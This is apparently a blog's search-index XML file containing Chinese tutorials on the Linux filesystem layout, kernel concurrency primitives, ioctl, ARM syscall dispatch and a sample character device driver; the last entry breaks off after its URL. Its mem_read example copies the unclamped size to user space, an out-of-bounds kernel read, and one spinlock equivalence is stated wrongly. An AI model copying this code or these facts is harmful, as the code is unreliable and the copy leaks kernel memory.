<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Linux文件系统]]></title>
    <url>%2F2018%2F10%2F17%2FLinux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[rootfs其实就是，针对特定的操作系统的架构，一种实现的形式;具体表现为，特定的目录（就理解为windows的文文件夹），目录之间的关系，即组织架构，以及特定的各种文件；/boot：系统启动的相关文件，如内核， initrd，以及grup（bootloader)，建议单独分区，分区千万不要做lvm/dev：设备文件 块设备：随机访问，以数据块为单位 字符设备：线性访问，以字符为单位 设备号：主设备和次设备号 /etc：配置文件/home：用户的家目录，每一个用户对应一个（当然在创建用户时，可不创建），建议单独分区/root：管理员的家目录，不可单独分区/lib：库文件/lib/modules：内核模块文件 静态库: 以.a结尾 动态库: 以.so结尾（类似windows .dll文件） /media：挂载点目录，以移动设备为主/mnt：挂载点目录，以额外临时文件系统为主（如：USB设备）/opt：可选目录，时期是用来安装第三方软件/proc：伪文件系统，内核映射文件，不可单独分区，默认为空/sys：伪文件系统，跟硬件设备相关属性的映射文件，不可单独分区，默认为空/tmp：临时文件/var/tmp：临时文件/bin：可执行文件，主要是用户执行命令/sbin：可执行文件，主要是管理命令/usr(universal share read-only)：只读文件/usr/bin：执行文件/usr/sbin：执行文件/usr/lib：库文件/usr/local：第三方软件安装目录 /usr/local/bin /usr/local/sbin /usr/local/lib busybox详细介绍：https://www.ibm.com/developerworks/cn/linux/l-busybox/]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux文件系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux内核分析（七）]]></title>
    <url>%2F2018%2F10%2F17%2FLinux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%83%EF%BC%89%2F</url>
    <content type="text"><![CDATA[* 1.并发和竞态简介 * 2.竞态解决办法 * 3.为我们的虚拟设备增加并发控制 并发和竞态简介并发与竞态概念何为并发并发是指多个执行单元同时、并行被执行。 何为竞态并发的执行单元对共享资源（硬件资源和软件上的全局变量，静态变量等）的访问容易发生竞态。 我们虚拟设备的缺陷对于我们前期的虚拟设备驱动个，假设一个执行单元A对其写入300个字符‘a’，而另一个执行单元B对其写入300个字符‘b’，第三个执行单元读取所有字符。如果A、B被顺序执行那么C读出的则不会出错，但如果A、B并发执行，那结果则是我们不可料想的。 竞态发生的情况 对称多处理器（SMP）的多个CPU：SMP是一种紧耦合、共享存储的系统模型，它的特点是多个CPU使用共同的系统总线，因此可以访问共同的外设和存储器。 单CPU内进程与抢占它的进程：2.6的内核支持抢占调度，一个进程在内核执行的时候可能被另一高优先级进程打断。 中断（硬中断、软中断、tasklet、低半部）与进程之间：中断可以打断正在执行的进程，处理中断的程序和被打断的进程间也可能发生竞态。 竞态的解决办法解决竞态问题的途径是保证对共享资源的互斥访问。访问共享资源的代码区域称为临界区，临界区要互斥机制保护。Linux设备驱动中常见的互斥机制有以下方式：中断屏蔽、原子操作、自旋锁和信号量等。上面我们已经分析了竞态产生的原因、发生的情况以及解决办法，下面我们对常见的解决办法一一分析。 中断屏蔽基本概念在单CPU中避免竞态的一种简单方法是在进入临界区之前屏蔽系统的中断。由于linux的异步I/O、进程调度等很多内容都依靠中断，所以我们应该尽快的执行完临界区的代码，换句话就是临界区代码应该尽量少。 具体操作linux内核提供了下面具体方法Local_irq_disable(); //屏蔽中断Local_irq_enable(); //打开中断Local_irq_save(flags); //禁止中断并保存当前cpu的中断位信息 原子操作基本概念原子操作指在执行过程中不会被别的代码中断的操作。 具体操作linux内核提供了一系列的函数来实现内核中的原子操作，这些操作分为两类，一类是整型原子操作，另一类是位原子操作，其都依赖底层CPU的原子操作实现，所以这些函数与CPU架构有密切关系。 整型原子操作 设置原子变量的值atomic_t v = ATOMIC_INIT(0); //定义原子变量v并初始化为0void atomic_set(atomic_t *v, int i); //设置原子变量值为i 获取原子变量的值atomic_read(atomic_t *v); //返回原子变量v的值 原子变量加、减操作void atomic_add(int i, atomic_t v); //原子变量v增加ivoid atomic_sub(int I, atomic_t v); //原子变量v减少i 原子变量自增、自减void atomic_inc(atomic_t v); //原子变量v自增1void atomic_dec(atomic_t v); //原子变量v自减1 操作并测试int atomic_inc_and_test(atomic_t v);int atomic_dec_and_test(atomic_t v);int atomic_sub_and_test(int i,atomic_t v);/上述三个函数对原子变量v自增、自减和减操作（没有加）后测试其是否为0，如果为0返回true，否则返回false*/ 操作并返回int atomic_add_return(int i,atomic_t v);int atomic_sub_return(int i,atomic_t v);int atomic_inc_return(atomic_t v);int atomic_dec_return(atomic_t v);/上述函数对原子变量v进行自增、自减、加、减操作，并返回新的值/ 位原子操作 设置位void set_bit(nr,void *addr); //设置addr地址的第nr位，即向该位写入1。 清除位void clear_bit(nr,void *addr); //清除addr地址的第nr位，即向该位写入0。 改变位void change_bit(nr,void *addr); //对addr地址的第nr取反 测试位int test_bit(nr,void *addr); //返回addr地址的第nr位 测试并操作位int test_and_set_bit(nr,void addr);int test_and_clear_bit(nr,void addr);int test_and_change_bit(nr,void addr);/上述函数等同于执行test_bit后，再执行xxx_bit函数*/ 自旋锁基本概念自旋锁是一种对临界资源进行互斥访问的手段。 工作原理为获得自旋锁，在某CPU上运行的代码需先执行一个原子操作，该操作测试并设置某个内存变量，由于其为原子操作，所以在该操作完成之前其他执行单元不可能访问这个内存变量，如果测试结果表明已经空闲，则程序获得这个自旋锁并继续执行，如果测试结果表明该锁仍被占用，程序将在一个小的循环内重复这个“测试并设置”操作，即进行所谓的“自旋”，通俗的说就是在“原地打转”。 具体操作linux内核中与自旋锁相关的操作主要有： 定义自旋锁spinlock_t lock; 初始自旋锁spin_lock_init(lock); 获得自旋锁spin_lock(lock); //获得自旋锁lockspin_trylock(lock); //尝试获取lock如果不能获得锁，返回假值，不在原地打转。 释放自旋锁spin_unlock(lock); //释放自旋锁为保证我们执行临界区代码的时候不被中断等影响我们的自旋锁又衍生了下面的内容 自旋锁衍生 spin_lock_irq() = spin_lock() + local_irq_disable() spin_unlock_irq() = spin_unlock() + local_irq_enable() spin_lock_irqsave() = spin_lock() + local_irq_save() spin_unlock_irqrestore() = spin_unlock() + local_irq_restore() spin_lock_bh() = spin_lock() + local_bh_disable() spin_unlock_bh() = spin_unlock() + local_bh_disable() 使用注意事项 自旋锁实质是忙等锁，因此在占用锁时间极短的情况下，使用锁才是合理的，反之则会影响系统性能。 自旋锁可能导致系统死锁。 自旋锁锁定期间不能调用可能引起进程调度的函数。 读写自旋锁基本概念为解决自旋锁中不能允许多个单元并发读的操作，衍生出了读写自旋锁，其不允许写操作并发，但允许读操作并发。 具体操作linux内核中与读写自旋锁相关的操作主要有： 定义和初始化读写自旋锁rwlock_t my_rwlock = RW_LOCK_UNLOCKED; //静态初始化rwlock_t my_rwlock;rwlock_init(&amp;my_rwlock); //动态初始化 读锁定read_lock();read_lock_irqsave();read_lock_irq();read_lock_bh(); 读解锁read_unlock();read_unlock_irqrestore();read_unlock_irq();read_unlock_bh(); 写锁定write_lock();write_lock_irqsave();write_lock_irq();write_lock_bh();write_trylock(); 写解锁 write_unlock();write_unlock_irqrestore();write_unlock_irq();write_unlock_bh(); 顺序锁基本概念顺序锁是对读写锁的一种优化，如果使用顺序锁，读执行单元在写执行单元对被顺序锁保护的共享资源进行写操作时仍然可以继续读，不必等待写执行单元的完成，写执行单元也不需等待读执行单元完成在进行写操作。 注意事项顺序锁保护的共享资源不含有指针，因为在写执行单元可能使得指针失效，但读执行单元如果此时访问该指针，将导致oops。 具体操作linux内核中与顺序锁相关的操作主要有： 写执行单元获得顺序锁write_seqlock();write_tryseqlock();write_seqlock_irqsave();write_seqlock_irq();write_seqlock_bh(); 写执行单元释放顺序锁write_sequnlock();write_sequnlock_irqrestore();write_sequnlock_irq();write_sequnlock_bh(); 读执行单元开始read_seqbegin();read_seqbegin_irqsave(); //local_irq_save + read_seqbegin 读执行单元重读read_seqretry ();read_seqretry_irqrestore (); RCU（读—拷贝—更新）基本概念：RCU可以看做是读写锁的高性能版本，相比读写锁，RCU的优点在于即允许多个读执行单元同时访问被保护数据，又允许多个读执行单元和多个写执行单元同时访问被保护的数据。 注意事项：RCU不能代替读写锁。 具体操作：linux内核中与RCU相关的操作主要有： 读锁定rcu_read_lock ();rcu_read_lock_bh (); 读解锁rcu_read_unlock ();rcu_read_unlock_bh (); 同步RCUsynchronize_rcu (); //由RCU写执行单元调用synchronize_sched(); //可以保证中断处理函数处理完毕，不能保证软中断处理结束 挂接回调call_rcu ();call_rcu_bh ();有关RCU的操作还有很多，大家可以参考网络。 信号量基本概念信号量用于保护临界区的常用方法与自旋锁类似，但不同的是当获取不到信号量时，进程不会原地打转而是进入休眠等待状态。 具体操作linux内核中与信号量相关的操作主要有： 定义信号量Struct semaphore sem; 初始化信号量void sema_init(struct semaphore *sem, int val); //初始化sem为val，当然还有系统定义的其他宏初始化，这里不列举 获得信号量void down(struct semaphore sem); //获得信号量sem，其会导致睡眠，并不能被信号打断int down_interruptible(struct semaphore sem); //进入睡眠可以被信号打断int down_trylock(struct semaphore *sem); //不会睡眠 释放信号量 void up(struct semaphore *sem); //释放信号量，唤醒等待进程注：当信号量被初始为0时，其可以用于同步。 Completion用于同步基本概念linux中的同步机制。 具体操作linux内核中与Completion相关的操作主要有： 定义Completionstruct completion *my_completion; 初始化Completionvoid init_completion(struct completion *x); 等待Completionvoid wait_for_completion(struct completion *); 唤醒Completion void complete(struct completion ); //唤醒一个 void complete_all(struct completion ); //唤醒该Completion的所有执行单元 读写信号量基本概念与自旋锁和读写自旋锁的关系类似 具体操作linux内核中与读写信号量相关的操作主要有： 定义和初始化读写自旋锁struct rw_semaphore sem;init_rwsem(&amp;sem); 读信号量获取down_read ();down_read_trylock(); 读信号量释放up_read (); 写信号量获取down_write ();down_write_trylock (); 写信号量释放up_write(); 互斥体基本概念用来实现互斥操作 具体操作linux内核中与互斥体相关的操作主要有： 定义和初始化互斥体struct mutex lock;mutex_init(&amp;lock); 获取互斥体void mutex_lock(struct mutex lock);int mutex_lock_interruptible(struct mutex lock);int mutex_lock_killable(struct mutex *lock); 释放互斥体void mutex_unlock(struct mutex *lock); 上面我们介绍了linux内核中为了解决竞态所提供的方法，我们下面使用信号量为我们的虚拟设备增加并发控制。 为我们的虚拟设备增加并发控制我们增加了并发控制后的代码如下，详细代码参考https: //github.com/wrjvszq/myblongs struct mem_dev{ struct cdev cdev; int mem[MEM_SIZE]; //全局内存4k dev_t devno; struct semaphore sem; //并发控制所使用的信号量 }; static ssize_t mem_write(struct file *filp, const char __user *buf, size_t size, loff_t *ppos){ unsigned long p = *ppos; unsigned int count = size; int ret = 0; int *pbase = filp -&gt; private_data; if(p &gt;= MEM_SIZE) return 0; if(count &gt; MEM_SIZE - p) count = MEM_SIZE - p; if(down_interruptible(&amp;my_dev.sem)) //获取信号量 return - ERESTARTSYS; if(copy_from_user(pbase + p,buf,count)){ ret = - EFAULT; }else{ *ppos += count; ret = count; } up(&amp;my_dev.sem); //释放信号量 return ret; } static ssize_t mem_read(struct file *filp, char __user *buf, size_t size, loff_t *ppos){ int * pbase = filp -&gt; private_data;/*获取数据地址*/ unsigned long p = *ppos;/*读的偏移*/ unsigned int count = size;/*读数据的大小*/ int ret = 0; if(p &gt;= MEM_SIZE)/*合法性判断*/ return 0; if(count &gt; MEM_SIZE - p)/*读取大小修正*/ count = MEM_SIZE - p; if(down_interruptible(&amp;my_dev.sem)) //获取信号量 return - ERESTARTSYS; if(copy_to_user(buf,pbase + p,size)){ ret = - EFAULT; }else{ *ppos += count; ret = count; } up(&amp;my_dev.sem); //释放信号量 return ret; }]]></content>
      <categories>
        <category>Linux</category>
        <category>Linux内核分析</category>
      </categories>
      <tags>
        <tag>linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux内核分析（六）]]></title>
    <url>%2F2018%2F10%2F17%2FLinux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%85%AD%EF%BC%89%2F</url>
    <content type="text"><![CDATA[* 1.字符设备控制方法实现 * 2.揭秘系统调用本质 字符设备控制方法实现设备控制简介 何为设备控制：我们所接触的大部分设备，除了读、写、打开关闭等方法外，还应该具有控制方法，比如：控制电机转速、串口配置波特率等。这就是对设备的控制方法。 用户如何进行设备控制：类似与我们在用户空间使用read、open等函数对设备进行操作，我们在用户空间对设备控制的函数是ioctl其原型为 int ioctl(int fd, int cmd, …)//fd为要控制的设备文件的描述符，cmd是控制命令，…依据第二个参数类似与我们的printf等多参函数。 Ioctl调用驱动那个函数：在我们的用户层进行ioctl调用的时候驱动会根据内核版本不同调用不同的函数：2.6.36以前的内核版本会调用 long (ioctl) (struct inode,struct file , unsigned int, unsigned long);2.6.36以后的内核会调用 long (unlocked_ioctl) (struct file *, unsigned int, unsigned long); Ioctl实现控制命令解析我们刚才说到ioctl进行控制的时候有个cmd参数其为int类型的也就是32位，我们的linux为了让这32位更加有意义，所表示的内容更多，所以将其分为了下面几个段 Type（类型/幻数8bit）：表明这是属于哪个设备的命令 Number（序号8bit）：用来区分统一设备的不同命令 Direction（2bit）：参数传递方向，可能的取值，_IOC_NODE（没有数据传输）、_IOC_READ（从设备读）、_IOC_WRITE（向设备写） Size（13/14bit()）：参数长度 定义命令我们的控制命令如此复杂，为了方便我们的linux系统提供了固定的宏来解决命令的定义，具体如下： _IO(type,nr); ：定义不带参数的命令 _IOR(type,nr,datatype); ：从设备读参数命令 _IOW(type,nr,datatype); ：向设备写入参数命令 下面定义一个向设备写入参数的命令例子 #define MEM_CLEAR _IOW(‘m’,0,int)//通常用一个字母来表示命令的类型 Ioctl实现下面我们去向我们上次实现的字符设备中添加ioctl方法，并实现设备重启命令（虚拟重启），对于不支持的命令我们返回-EINVAL代码如下: long mem_ioctl(struct file *fd, unsigned int cmd, unsigned long arg){ switch(cmd){ case MEM_RESTART: printk(&quot;&lt;0&gt; memdev is restart&quot;); break; default: return -EINVAL; } return 0; } 揭秘系统调用本质由于我自己的PC的调用过程不太熟悉，下面以arm的调用过程分析一下我们用户层调用read之后发生了什么，是怎么调用到我们驱动写的read函数的呢，我们下面进行深入剖析。 代码分析我们首先使用得到arm上可执行的应用程序 arm-linux-gcc -g -static read_mem.c -o read_mem然后使用arm-linux-objdump -D -S read_mem &gt;dump 得到汇编文件，我们找到main函数的汇编实现 int main(void) { 8228: e92d4800 push {fp, lr} 822c: e28db004 add fp, sp, #4 ; 0x4 8230: e24dd008 sub sp, sp, #8 ; 0x8 int fd = 0; 8234: e3a03000 mov r3, #0 ; 0x0 8238: e50b3008 str r3, [fp, #-8] int test = 0; 823c: e3a03000 mov r3, #0 ; 0x0 8240: e50b300c str r3, [fp, #-12] fd = open(&quot;/dev/memdev0&quot;,O_RDWR); 8244: e59f004c ldr r0, [pc, #76] ; 8298 &lt;main+0x70&gt; 8248: e3a01002 mov r1, #2 ; 0x2 824c: eb0028a3 bl 124e0 &lt;__libc_open&gt; 8250: e1a03000 mov r3, r0 8254: e50b3008 str r3, [fp, #-8] read(fd,&amp;test,sizeof(int)); 8258: e24b300c sub r3, fp, #12 ; 0xc 825c: e51b0008 ldr r0, [fp, #-8] 8260: e1a01003 mov r1, r3 8264: e3a02004 mov r2, #4 ; 0x4 8268: eb0028e4 bl 12600 &lt;__libc_read&gt;//我们的read函数最终调用了__libc_read printf(&quot;the test is %d\n&quot;,test); 826c: e51b300c ldr r3, [fp, #-12] 8270: e59f0024 ldr r0, [pc, #36] ; 829c &lt;main+0x74&gt; 8274: e1a01003 mov r1, r3 8278: eb000364 bl 9010 &lt;_IO_printf&gt; close(fd); 827c: e51b0008 ldr r0, [fp, #-8] 8280: eb0028ba bl 12570 &lt;__libc_close&gt; return 0; 8284: e3a03000 mov r3, #0 ; 0x0 } 在上面代码中大部分汇编指令都知道用法，但是svc调用引起注意，通过查阅资料才发现，我们应用程序通过svc 0x00000000可以产生异常，进入内核空间。然后呢，系统处理异常，这中间牵扯好多代码还有中断的一些知识，我们找时间在专门分析，总之经过一大堆的处理最后它会跳到entry-common.S中的下面代码： .align 5 ENTRY(vector_swi) sub sp, sp, #S_FRAME_SIZE stmia sp, {r0 - r12} @ Calling r0 - r12 ARM( add r8, sp, #S_PC ) ARM( stmdb r8, {sp, lr}^ ) @ Calling sp, lr THUMB( mov r8, sp ) THUMB( store_user_sp_lr r8, r10, S_SP ) @ calling sp, lr mrs r8, spsr @ called from non-FIQ mode, so ok. str lr, [sp, #S_PC] @ Save calling PC str r8, [sp, #S_PSR] @ Save CPSR str r0, [sp, #S_OLD_R0] @ Save OLD_R0 zero_fp /* * Get the system call number. */ #if defined(CONFIG_OABI_COMPAT) /* * If we have CONFIG_OABI_COMPAT then we need to look at the swi * value to determine if it is an EABI or an old ABI call. */ #ifdef CONFIG_ARM_THUMB tst r8, #PSR_T_BIT movne r10, #0 @ no thumb OABI emulation ldreq r10, [lr, #-4] @ get SWI instruction #else ldr r10, [lr, #-4] @ get SWI instruction A710( and ip, r10, #0x0f000000 @ check for SWI ) A710( teq ip, #0x0f000000 ) A710( bne .Larm710bug ) #endif #ifdef CONFIG_CPU_ENDIAN_BE8 rev r10, r10 @ little endian instruction #endif #elif defined(CONFIG_AEABI) /* * Pure EABI user space always put syscall number into scno (r7). */ A710( ldr ip, [lr, #-4] @ get SWI instruction ) A710( and ip, ip, #0x0f000000 @ check for SWI ) A710( teq ip, #0x0f000000 ) A710( bne .Larm710bug ) #elif defined(CONFIG_ARM_THUMB) /* Legacy ABI only, possibly thumb mode. */ tst r8, #PSR_T_BIT @ this is SPSR from save_user_regs addne scno, r7, #__NR_SYSCALL_BASE @ put OS number in ldreq scno, [lr, #-4] #else /* Legacy ABI only. */ ldr scno, [lr, #-4] @ get SWI instruction A710( and ip, scno, #0x0f000000 @ check for SWI ) A710( teq ip, #0x0f000000 ) A710( bne .Larm710bug ) #endif #ifdef CONFIG_ALIGNMENT_TRAP ldr ip, __cr_alignment ldr ip, [ip] mcr p15, 0, ip, c1, c0 @ update control register #endif enable_irq get_thread_info tsk adr tbl, sys_call_table @ load syscall table pointer 该段代码中我们先会获取系统调用的标号刚才让大家记住的3，然后呢会去查找sys_call_table我们找到 .type sys_call_table, #object ENTRY(sys_call_table) #include &quot;calls.S&quot; #undef ABI #undef OBSOLETE 在calls.S中我们找到了下面东西（列出部分） */ /* 0 */ CALL(sys_restart_syscall) CALL(sys_exit) CALL(sys_fork_wrapper) CALL(sys_read) CALL(sys_write) /* 5 */ CALL(sys_open) CALL(sys_close) CALL(sys_ni_syscall) /* was sys_waitpid */ CALL(sys_creat) CALL(sys_link) 我们发现我们刚才记住的数字3刚好对应的是sys_read，在read_write.c中我们可以找到sys_read函数 SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count) { struct file *file; ssize_t ret = -EBADF; int fput_needed; file = fget_light(fd, &amp;fput_needed); if (file) { loff_t pos = file_pos_read(file); ret = vfs_read(file, buf, count, &amp;pos);//调用虚拟文件系统的read file_pos_write(file, pos); fput_light(file, fput_needed); } return ret; } 关于SYSCALL_DEFINE3这个宏的解析大家可以去http://blog.csdn.net/p_panyuch/article/details/5648007 这篇文章查看，在此我就不分析了，我们继续找到vfs_read代码如下： ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos) { ssize_t ret; if (!(file-&gt;f_mode &amp; FMODE_READ)) return -EBADF; if (!file-&gt;f_op || (!file-&gt;f_op-&gt;read &amp;&amp; !file-&gt;f_op-&gt;aio_read)) return -EINVAL; if (unlikely(!access_ok(VERIFY_WRITE, buf, count))) return -EFAULT; ret = rw_verify_area(READ, file, pos, count); if (ret &gt;= 0) { count = ret; if (file-&gt;f_op-&gt;read)//我们的文件读函数指针不为空 ret = file-&gt;f_op-&gt;read(file, buf, count, pos);//执行我们驱动中的读函数 else ret = do_sync_read(file, buf, count, pos); if (ret &gt; 0) { fsnotify_access(file); add_rchar(current, ret); } inc_syscr(current); } return ret; } 过程总结通过上面的分析我们已经了解的read函数的调用基本过程，下面我们将read函数的调用过程在进行总结： 寻找svc异常总体入口，并进入内核空间 取出系统调用的标号 根据系统调用标号，在sys_call_table中找到对应的系统调用函数 根据系统函数比如sys_read找到对应的虚拟文件系统的read 虚拟文件系统在调用驱动的read。]]></content>
      <categories>
        <category>Linux</category>
        <category>Linux内核分析</category>
      </categories>
      <tags>
        <tag>linux内核分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux内核分析（五）]]></title>
    <url>%2F2018%2F10%2F17%2FLinux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%94%EF%BC%89%2F</url>
    <content type="text"><![CDATA[* 1.字符设备驱动基础 * 2.简单字符设备驱动实现 * 3.驱动测试 字符设备基础字符设备描述结构在linux2.6内核中，使用cdev结构体描述一个字符设备，其定义如下： struct cdev { struct kobject kobj;/*基于kobject*/ struct module *owner; /*所属模块*/ const struct file_operations *ops; /*设备文件操作函数集*/ struct list_head list; dev_t dev; /*设备号*/ unsigned int count; /*该种类型设备数目*/ }; 上面结构中需要我们进行初始化的有ops和dev，下面我们会对这两个成员进行分析。注：kobject结构是驱动中很重要的一个结构，由于其复杂性，我们现在不进行介绍，后面会详细介绍。 设备号何为设备号cdev结构体中dev成员定义了设备号，而dev_t则为U32类型的也就是32位，其中12位为主设备号，20位为次设备号。我们执行ls –l /dev/可看到下图，其中左边红框为主设备号，右边为次设备号 何为主设备号用来对应该设备为何种类型设备。（比如串口我们用一个数字识别，而串口有好几个） 何为次设备号用来对应同一类型设备下的具体设备。（用次设备号来具体区分是哪个串口） 设备号相关操作 通过主设备号和次设备号获取dev：dev = MKDEV(主，次); 通过dev获取主设备号：主 = MAJOR(dev); 通过dev获取次设备号：dev = MINOR(dev); 设备号分配设备号的分配有两种方式，一种是静态的，另一种是动态的，下面一一分析 静态分配：也就是程序员自己指定设备号，通过register_chrdev_region();函数向内核申请，可能会导致和内核已有的冲突，从而失败。 动态分配：通过 alloc_chrdev_region(); 函数向内核申请设备号。 释放设备号：通过 unregister_chrdev_region(); 释放申请到的设备号。 file_operations操作函数集file_operations结构体中的成员函数在我们驱动开发过程中极为重要，其中的内容相当庞大，下面我们看看其定义： struct file_operations { struct module *owner;/*拥有该结构的模块的指针，一般为THIS_MODULES*/ loff_t (*llseek) (struct file *, loff_t, int); /*用来修改当前文件的读写指针*/ ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);/*从设备读取数据*/ ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);/*向设备发送数据*/ ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t); /*初始化一个异步的读取操作*/ ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t); /*初始化一个异步的写入操作*/ int (*readdir) (struct file *, void *, filldir_t); /*只用于读取目录，对于设备文件该字段为NULL*/ unsigned int (*poll) (struct file *, struct poll_table_struct *);/*轮询函数，判断目前是否可以进行非阻塞的读取或写入*/ long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long); /* 不用BLK的文件系统，将使用此函数代替ioctl*/ long (*compat_ioctl) (struct file *, unsigned int, unsigned long); /* 代替ioctl*/ int (*mmap) (struct file *, struct vm_area_struct *);/*用于请求将设备内存映射到进程地址空间*/ int (*open) (struct inode *, struct file *);/*打开*/ int (*flush) (struct file *, fl_owner_t id); /*在进程关闭它的设备文件描述符的拷贝时调用; 它应当执行(并且等待)设备的任何未完成的操作. */ int (*release) (struct inode *, struct file *);/*关闭*/ int (*fsync) (struct file *, int datasync); /*刷新待处理数据*/ int (*aio_fsync) (struct kiocb *, int datasync); /*异步fsync*/ int (*fasync) (int, struct file *, int); /*通知设备FASYNC标志发生变化*/ int (*lock) (struct file *, int, struct file_lock *);/* 实现文件加锁*/ ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); /*通常为NULL*/ unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); /*在当前的进程地址空间找的一个未映射的内存段*/ int (*check_flags)(int); /*法允许模块检查传递给 fnctl(F_SETFL...) 调用的标志*/ int (*flock) (struct file *, int, struct file_lock *);/**/ ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); /*由VFS调用，将管道数据粘贴到文件*/ ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); /*由VFS调用，将文件数据粘贴到管道*/ int (*setlease)(struct file *, long, struct file_lock **);/**/ long (*fallocate)(struct file *file, int mode, loff_t offset, loff_t len); /**/ } 上面结构体中的函数指针所指向的函数，在我们在进行open、write、read等系统调用的时候最终会被调用到，所以我们的驱动中想为应用层实现那种调用就要在此实现。 字符设备驱动初始化我们通过上面的分析对设备号和操作函数集有了一定的了解下面我们来看字符设备驱动初始化，其主要步骤如下。 分配cdev结构：有静态（直接定义）动态（cdev_alloc();）两种方式 初始化cdev结构：使用 cdev_init(struct cdev cdev, const struct file_operations fops) 初始化 驱动注册：使用 int cdev_add(struct cdev *p, dev_t dev, unsigned count)//count为该种类型的设备个数注册 硬件初始化：阅读芯片手册进行硬件设备的初始化 完成操作函数集：实现要用的操作（设备方法） 驱动注销：使用 void cdev_del(struct cdev *p) 注销 字符设备驱动模型及调用关系下面我通过一张图将字符设备的驱动结构、以及字符设备驱动与用户空间的调用关系进行展示： 遗漏知识我们内核空间和用户空间的数据交互要用到下面两个函数： copy_from_user();//从用户空间读 copy_to_user();//写入用户空间 简单字符设备驱动实现经过上面的分析我们对字符设备有一定了解，下面我们来完成一个最简单的字符设备驱动。我只展示最主要的代码，整个项目工程在https://github.com/wrjvszq/myblongs.git欢迎大家关注。 字符设备驱动编写因为驱动本身就是一个内核模块，下面的字符设备驱动只实现了部分方法。 #include&lt;linux/module.h&gt; #include&lt;linux/init.h&gt; #include&lt;linux/cdev.h&gt; #include&lt;linux/fs.h&gt; #include&lt;asm/uaccess.h&gt; #define MEM_SIZE 1024 MODULE_LICENSE(&quot;GPL&quot;); struct mem_dev{ struct cdev cdev; int mem[MEM_SIZE];//全局内存4k dev_t devno; }; struct mem_dev my_dev; /*打开设备*/ int mem_open(struct inode *inode, struct file *filp){ int num = MINOR(inode-&gt;i_rdev);/*获取次设备号*/ if(num == 0){/*判断为那个设备*/ filp -&gt; private_data = my_dev.mem;/*将设备结构体指针复制给文件私有数据指针*/ } return 0; } /*文件关闭函数*/ int mem_release(struct inode *inode, struct file *filp){ return 0; } static ssize_t mem_read(struct file *filp, char __user *buf, size_t size, loff_t *ppos){ int * pbase = filp -&gt; private_data;/*获取数据地址*/ unsigned long p = *ppos;/*读的偏移*/ unsigned int count = size;/*读数据的大小*/ int ret = 0; if(p &gt;= MEM_SIZE)/*合法性判断*/ return 0; if(count &gt; MEM_SIZE - p)/*读取大小修正*/ count = MEM_SIZE - p; if(copy_to_user(buf,pbase + p,size)){ ret = - EFAULT; }else{ *ppos += count; ret = count; } return ret; } static ssize_t mem_write(struct file *filp, const char __user *buf, size_t size, loff_t *ppos){ unsigned long p = *ppos; unsigned int count = size; int ret = 0; int *pbase = filp -&gt; private_data; if(p &gt;= MEM_SIZE) return 0; if(count &gt; MEM_SIZE - p) count = MEM_SIZE - p; if(copy_from_user(pbase + p,buf,count)){ ret = - EFAULT; }else{ *ppos += count; ret = count; } return ret; } /*seek文件定位函数*/ static loff_t mem_llseek(struct file *filp, loff_t offset, int whence){ loff_t newpos; switch(whence) { case SEEK_SET:/*从文件头开始定位*/ newpos = offset; break; case SEEK_CUR:/*从当前位置开始定位*/ newpos = filp-&gt;f_pos + offset; break; case SEEK_END: newpos = MEM_SIZE * sizeof(int)-1 + offset;/*从文件尾开始定位*/ break; default: return -EINVAL; } if ((newpos&lt;0) || (newpos&gt;MEM_SIZE * sizeof(int)))/*检查文件指针移动后位置是否正确*/ return -EINVAL; filp-&gt;f_pos = newpos; return newpos; } const struct file_operations mem_ops = { .llseek = mem_llseek, .open = mem_open, .read = mem_read, .write = mem_write, .release = mem_release, }; static int memdev_init(void){ int ret = -1; /*动态分配设备号*/ ret = alloc_chrdev_region(&amp;my_dev.devno,0,1,&quot;memdev&quot;); if (ret &gt;= 0){ cdev_init(&amp;my_dev.cdev,&amp;mem_ops);/*初始化字符设备*/ cdev_add(&amp;my_dev.cdev,my_dev.devno,1);/*添加字符设备*/ } return ret; } static void memdev_exit(void){ cdev_del(&amp;my_dev.cdev); unregister_chrdev_region(my_dev.devno,1); } module_init(memdev_init); module_exit(memdev_exit); 驱动测试经过上面的代码我们已经实现了一个简单的字符设备驱动，我们下面进行测试。（应用程序在https://github.com/wrjvszq/myblongs.git 上） 加载内核模块我们使用 insmod memdev.ko 命令加载内核模块 获取设备号我们的设备号是动态申请到的，所以我们要通过下面的命令查看设备号cat /proc/devices找到我们的设备memdev的设备号 建立设备文件使用如下命令建立设备文件：mknod /dev/文件名 c 主设备号次设备号上面命令中文件名为我们在应用程序中打开的文件名c代表字符设备主设备号为上一步找到的，我的位249次设备号非负即可，但不能超过自己所创建的设备数。比如我的就是 mknod /dev/memdev0 c 249 0 编译应用程序并测试使用gcc对应用程序进行编译，然后先使用write对设备进行写入，在使用read对设备读取，完成测试。]]></content>
      <categories>
        <category>Linux</category>
        <category>Linux内核分析</category>
      </categories>
      <tags>
        <tag>linux内核分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux内核分析（四）]]></title>
    <url>%2F2018%2F10%2F17%2FLinux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
